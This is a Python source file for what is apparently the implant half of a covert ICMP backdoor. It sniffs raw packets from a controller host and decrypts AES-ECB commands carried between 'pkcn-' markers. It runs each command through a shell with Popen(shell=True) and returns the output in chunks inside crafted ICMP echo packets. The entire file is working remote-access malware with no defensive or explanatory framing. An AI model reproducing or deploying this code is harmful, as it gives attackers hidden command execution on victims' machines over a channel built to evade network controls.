from base64 import b64encode
from socket import RCVALL_ON, SIO_RCVALL, SO_REUSEADDR, SOL_SOCKET, socket,AF_INET,IPPROTO_IP,IP_HDRINCL,SOCK_RAW,getprotobyname,gethostname
from struct import pack
from re import findall
from subprocess import Popen,PIPE
from Crypto.Cipher import AES
from binascii import a2b_hex, b2a_hex
from json import dumps, loads
from random import randint
from settings import *

class DataAesCrypt:

    def __init__(self,keys:str,data:str) -> None:
        self.keys = keys[:16].encode("utf-8")
        self.data = data 

    def encrypt(self):
        text = self.data + (16 - (len(self.data) % 16)) * "*"
        aes = AES.new(self.keys, AES.MODE_ECB) 
        en_text = b2a_hex(aes.encrypt(text.encode("utf-8"))) 
        return en_text.decode("utf-8")
    
    def decrypt(self):
        aes = AES.new(self.keys, AES.MODE_ECB)
        text = aes.decrypt(a2b_hex(self.data.encode("utf-8")))
        return text.decode("utf-8").split("*")[0]
def checksum(packet):
    sum =0
    countTo = (len(packet)//2)*2 
    count =0
    while count <countTo:
        sum += ((packet[count+1] << 8) | packet[count])
        count += 2
    if countTo<len(packet):
        sum += packet[len(packet) - 1]
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send(re_data,ip):
    re_data = DataAesCrypt(AES_KEY,re_data).encrypt()
    data = "pkcn-"+re_data+"-pkcn"
    b = data.encode("utf-8")
    seq = randint(1,256)
    rawsocket = socket(AF_INET,SOCK_RAW,getprotobyname("icmp"))
    packet = pack("!BBHHH0"+str(len(b))+"s",8,0,0,1,seq,b)
    chksum = checksum(packet)
    packet = pack("!BBHHH0"+str(len(b))+"s",8,0,chksum,1,seq,b)
    rawsocket.sendto(packet,(ip,0))

if __name__ == "__main__":
    rawSocket = socket(AF_INET,SOCK_RAW,IPPROTO_IP)
    rawSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    ip_local = socket()
    ip_local.connect(("www.baidu.com",80))
    local_ip = ip_local.getsockname()[0]
    ip_local.close()
    rawSocket.bind((local_ip, 0))
    rawSocket.ioctl(SIO_RCVALL, RCVALL_ON)
    rawSocket.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    while True:
        try:
            pkt= rawSocket.recvfrom(2048)
        except:
            continue
        if pkt[1][0] == LOCAL_HOST:
            data = findall("pkcn-(.*?)-pkcn",str(pkt[0]))[0]
            if data == []:
                continue
            data = loads(DataAesCrypt(AES_KEY,data).decrypt())
            try:
                r = Popen(data.get("cdm"),shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
                r.stdin.close()
                r2 = r.stdout.read().decode("gbk").encode("utf-8")
                r3 = r.stderr.read().decode()
                if not r2:
                    if r3:
                        r2 = r3
                    else:
                        r2 = "命令已执行完毕！但无回显！"
                else:
                    r2 = r2.decode("utf-8")
                r.stdout.close()
                r.stderr.close()
            except:
                r2 = "命令执行失败！"
            r2 = r2.encode("utf-8")
            sum_r = len(r2)
            while len(r2) > 300:
                data_r = r2[:300]
                send_data_r = dumps({"sum":sum_r,"send_size":len(data_r),"data":data_r.decode("utf-8")})
                send_data_r = str(b64encode(send_data_r.encode("utf-8"))).split("'")[1]
                send(send_data_r,LOCAL_HOST)
                r2 = r2[300:]
                sum_r = len(r2)
            send_data_r = dumps({"sum":sum_r,"send_size":len(r2),"data":r2.decode("utf-8")})
            send_data_r = str(b64encode(send_data_r.encode("utf-8"))).split("'")[1]
            send(send_data_r,LOCAL_HOST)
 